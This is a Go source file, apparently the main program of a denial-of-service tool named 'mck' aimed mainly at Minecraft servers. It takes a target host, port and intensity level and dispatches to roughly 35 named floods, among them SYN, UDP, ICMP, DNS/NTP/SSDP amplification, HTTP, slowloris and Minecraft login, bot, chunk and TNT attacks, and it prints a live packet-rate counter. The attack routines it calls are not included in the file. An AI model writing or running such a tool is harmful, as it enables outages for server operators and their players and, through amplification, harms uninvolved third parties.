package main

import (
	"flag"
	"fmt"
	"os"
	"sync/atomic"
	"time"
)

type Config struct {
	Target   string
	Port     int
	Threads  int
	Duration time.Duration
	Size     int
	Level    string
	Version  int
}

var (
	sent   int64
	errors int64
	start  time.Time
)

func parseFlags() (string, Config) {
	if len(os.Args) < 2 {
		fmt.Println("usage: mck <attack> --target host --port port --level L1|L2|L3")
		os.Exit(1)
	}
	attack := os.Args[1]

	fs := flag.NewFlagSet(attack, flag.ExitOnError)
	target := fs.String("target", "", "Target host")
	port := fs.Int("port", 25565, "Target port")
	level := fs.String("level", "L2", "L1|L2|L3")
	threads := fs.Int("threads", 0, "Override thread count")
	duration := fs.Int("duration", 0, "Override duration seconds")
	size := fs.Int("size", 0, "Override packet size")
	version := fs.Int("mcver", 760, "MC protocol version (760 = 1.19.2)")
	fs.Parse(os.Args[2:])

	if *target == "" {
		fmt.Println("[-] --target required")
		os.Exit(1)
	}

	cfg := Config{Target: *target, Port: *port, Level: *level, Version: *version}
	switch *level {
	case "L1":
		cfg.Threads, cfg.Duration, cfg.Size = 10, 60*time.Second, 1024
	case "L3":
		cfg.Threads, cfg.Duration, cfg.Size = 200, 300*time.Second, 16384
	default:
		cfg.Threads, cfg.Duration, cfg.Size = 50, 120*time.Second, 4096
	}
	if *threads > 0 {
		cfg.Threads = *threads
	}
	if *duration > 0 {
		cfg.Duration = time.Duration(*duration) * time.Second
	}
	if *size > 0 {
		cfg.Size = *size
	}
	return attack, cfg
}

func monitor(stop chan struct{}) {
	ticker := time.NewTicker(250 * time.Millisecond)
	defer ticker.Stop()
	last := int64(0)
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			cur := atomic.LoadInt64(&sent)
			errs := atomic.LoadInt64(&errors)
			pps := (cur - last) * 4
			last = cur
			elapsed := time.Since(start).Seconds()
			fmt.Printf("\r\033[96m[+]\033[0m %5.1fs | sent \033[95m%12d\033[0m | pps \033[93m%10d\033[0m | err \033[91m%8d\033[0m",
				elapsed, cur, pps, errs)
		}
	}
}

func main() {
	attack, cfg := parseFlags()
	start = time.Now()

	fmt.Printf("\033[96m[*] Attack: %s\033[0m\n", attack)
	fmt.Printf("\033[96m[*] Target: %s:%d | Level: %s | Threads: %d | Duration: %v | Size: %d\033[0m\n",
		cfg.Target, cfg.Port, cfg.Level, cfg.Threads, cfg.Duration, cfg.Size)
	fmt.Printf("\033[90m[*] Raw sockets (SYN/ACK/RST/FIN/ICMP/DNS/NTP/SSDP/GRE) need root\033[0m\n\n")

	stopMon := make(chan struct{})
	go monitor(stopMon)

	switch attack {
	case "tcp":
		attackTCP(cfg)
	case "syn":
		attackSYN(cfg)
	case "ack":
		attackACK(cfg)
	case "rst":
		attackRST(cfg)
	case "fin":
		attackFIN(cfg)
	case "udp":
		attackUDP(cfg)
	case "icmp":
		attackICMP(cfg)
	case "dns":
		attackDNS(cfg)
	case "ntp":
		attackNTP(cfg)
	case "ssdp":
		attackSSDP(cfg)
	case "gre":
		attackGRE(cfg)
	case "http":
		attackHTTP(cfg)
	case "https":
		attackHTTPS(cfg)
	case "websocket":
		attackWS(cfg)
	case "proxy":
		attackProxy(cfg)
	case "slowloris":
		attackSlowloris(cfg)
	case "mc-handshake":
		mcHandshake(cfg)
	case "mc-status":
		mcStatus(cfg)
	case "mc-login":
		mcLogin(cfg)
	case "mc-bot":
		mcBot(cfg)
	case "mc-compression":
		mcCompression(cfg)
	case "mc-chunk":
		mcChunk(cfg)
	case "mc-entity":
		mcEntity(cfg)
	case "mc-command":
		mcCommand(cfg)
	case "mc-plugin":
		mcPlugin(cfg)
	case "entity-spam":
		mcEntitySpam(cfg)
	case "chunk-spam":
		mcChunkSpam(cfg)
	case "redstone":
		mcRedstone(cfg)
	case "hopper":
		mcHopper(cfg)
	case "tnt":
		mcTNT(cfg)
	case "world-save":
		mcWorldSave(cfg)
	case "memory":
		mcMemory(cfg)
	case "cpu":
		mcCPU(cfg)
	default:
		fmt.Printf("\033[91m[!] Unknown attack: %s\033[0m\n", attack)
		os.Exit(1)
	}

	close(stopMon)
	time.Sleep(300 * time.Millisecond)
	fmt.Printf("\n\n\033[92m[✓] Complete. Total: %d | Errors: %d\033[0m\n",
		atomic.LoadInt64(&sent), atomic.LoadInt64(&errors))
}
